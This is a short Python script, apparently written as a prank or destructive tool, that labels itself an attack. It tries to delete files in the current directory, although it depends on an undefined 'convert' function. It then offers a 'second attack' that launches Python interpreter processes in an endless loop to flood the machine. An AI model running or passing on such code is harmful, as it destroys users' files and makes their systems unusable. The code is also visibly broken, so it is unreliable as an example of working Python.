import os
import time
try:
 path=[os.path.abspath(x) for x in os.listdir('.')]
 x=(convert(path))
 os.remove(x)
 print("Successful.")
 time.sleep(999999)
except:
 print("Unsuccessful.")
 n=input(("Want to try a second attack, enter Y to try second attack, press N to exit, press A to try the 1st attack again:"))
 if n==("Y"):
  while True:
   try:
    os.startfile("python.exe")
   except:
    os.startfile("pythonw.exe")
   try:
    os.startfile("python.exe")
   except KeyboardInterrupt:
    os.startfile("pythonw.exe")
